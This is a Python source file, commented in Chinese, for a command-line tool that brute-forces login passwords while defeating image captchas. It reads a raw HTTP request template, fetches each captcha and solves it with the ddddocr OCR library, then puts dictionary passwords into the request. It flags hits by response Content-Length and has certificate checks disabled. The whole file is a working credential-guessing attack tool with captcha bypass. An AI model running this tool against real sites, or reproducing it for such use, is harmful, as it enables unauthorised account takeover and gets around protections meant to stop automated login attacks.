import sys

import ddddocr
import requests
import argparse

# 网络请求使用的协议
protocol = "http://"


# 传入数据包内容，返回method,url,header,body
# 数据包错误返回0,0,0,0
def prepareInfo(content=""):
    content = content.replace("\r\n", "\n")
    # 分离http header和http body
    httpRequest = content.split("\n\n", 1)
    # 初始化要返回的数据
    method = url = head = body = ""
    header = {}
    if len(httpRequest) == 2:  # POST请求
        head = httpRequest[0].split("\n")
        body = httpRequest[1]
    elif len(httpRequest) == 1:  # GET请求
        head = httpRequest[0].split("\n")
    else:  # 数据包错误
        return 0, 0, 0, 0
    # 解析http header的数据包
    for i, line in enumerate(head):
        if i == 0:  # 数据包首行
            tmp = line.split(" ")
            if len(tmp) != 3:  # 数据包错误
                return 0, 0, 0, 0
            method = tmp[0].lower()
            url = tmp[1]
        else:  # 其他头字段
            tmp = line.split(":", 1)
            if len(tmp) < 2:  # 数据包错误
                return 0, 0, 0, 0
            header[tmp[0].lower().replace(" ", "")] = tmp[1].replace(" ", "")
    return method, url, header, body


# 识别验证码
# 传入domain,method,url,header,body返回验证码
def getCaptcha(method, url, header, body):
    # 从header中的host这种提取域名
    if header["host"] != "":
        url = protocol + header["host"] + url
    else:
        return -1

    if method == "post":
        resp = requests.post(url, headers=header, data=body, verify=False)
    else:
        resp = requests.get(url, headers=header, verify=False)
    captcha = ddddocr.DdddOcr().classification(resp.content)
    print("验证码：{0}".format(captcha), end=",")
    return captcha


# 发起网络请求
# 传入domain, method, url, header, body返回当前数据包长度
def blastRequest(method, url, header, body):
    if header["host"] != "":
        url = protocol + header["host"] + url
    else:
        return -1
    if method == "post":
        resp = requests.post(url, headers=header, data=body, verify=False)
    else:
        resp = requests.get(url, headers=header, verify=False)
    return resp.headers["Content-Length"]


# 传入替换密码后的content和验证码content以及验证码错误的数据包长度
def allRequest(reqContent, captchaContent, errLen, rcaptcha="####"):
    cmethod, curl, cheader, cbody = prepareInfo(captchaContent)
    if cmethod == 0:
        return 0
    captcha = getCaptcha(cmethod, curl, cheader, cbody)
    if captcha == 0:
        return 0
    reqContent = reqContent.replace(rcaptcha, captcha)
    rmethod, rurl, rheader, rbody = prepareInfo(reqContent)
    len = blastRequest(rmethod, rurl, rheader, rbody)
    if len == errLen:
        print("验证码识别错误，正在重试")
        allRequest(reqContent, captchaContent, errLen, captcha)
    else:
        return len


# 替换请求包中要爆破的数据
def prepare(reqContent, rep, captchaContent, errLen):
    reqContent = reqContent.replace("****", rep)
    len = allRequest(reqContent, captchaContent, errLen)
    if len <= 0:
        sys.exit(len)
    print("爆破的密码为：{0},返回的长度为:{1}".format(rep, len))


# 读取文件，并爆破
def main(blastFile, captchaFile, passFile, errLen):
    if blastFile == None or captchaFile == None or passFile == None or errLen == None:
        print("python main.py -r blast.txt -c captcha.txt -d dict.txt -l 6335 -s True")
        sys.exit(-2)
    rfile = open(blastFile, "rb").read().decode("utf8")
    cfile = open(captchaFile, "rb").read().decode("utf8")
    pfile = open(passFile, "rb")
    pwds = pfile.readlines()
    for pwd in pwds:
        prepare(rfile, pwd.decode("utf8").strip(), cfile, errLen)


# 验证码位置####，爆破位置用****代替
if __name__ == '__main__':
    show = "爆破数据包中验证码使用####代替，爆破位置用****代替"
    parser = argparse.ArgumentParser(description=show)
    parser.add_argument('-r', help='爆破使用的数据包')
    parser.add_argument('-c', help='验证码使用的数据包')
    parser.add_argument('-d', help='字典文件')
    parser.add_argument('-l', help='验证码错误时返回的content-length')
    parser.add_argument('-s', help='是否使用https请求，默认使用http', type=bool)
    args = parser.parse_args()
    if args.s:
        protocol="https://"
    main(args.r, args.c, args.d, args.l)
